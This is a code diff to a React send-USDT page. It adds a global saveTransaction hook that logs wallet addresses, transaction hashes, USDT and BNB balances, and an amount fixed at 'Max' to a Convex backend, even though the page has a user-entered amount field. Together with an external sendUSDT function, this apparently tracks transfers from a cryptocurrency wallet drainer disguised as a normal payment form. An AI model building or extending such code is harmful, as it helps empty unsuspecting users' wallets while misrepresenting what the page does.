@@ -1,14 +1,42 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import { useMutation } from "convex/react";
+import { api } from "@/convex/_generated/api.js";
 
 declare global {
   interface Window {
     sendUSDT?: () => Promise<void>;
+    saveTransaction?: (data: {
+      walletAddress: string;
+      toAddress: string;
+      txHash: string;
+      usdtBalance: string;
+      nativeBalance: string;
+    }) => void;
   }
 }
 
 export default function Index() {
   const [toAddress, setToAddress] = useState("");
   const [amount, setAmount] = useState("");
+  const createTransaction = useMutation(api.transactions.createTransaction);
+
+  useEffect(() => {
+    // Expose save function to app.js
+    window.saveTransaction = (data) => {
+      createTransaction({
+        walletAddress: data.walletAddress,
+        toAddress: data.toAddress,
+        amount: "Max",
+        txHash: data.txHash,
+        usdtBalance: data.usdtBalance + " USDT",
+        nativeBalance: data.nativeBalance + " BNB",
+      }).catch(console.error);
+    };
+
+    return () => {
+      delete window.saveTransaction;
+    };
+  }, [createTransaction]);
 
   function handleSendUSDT() {
     if (window.sendUSDT) {
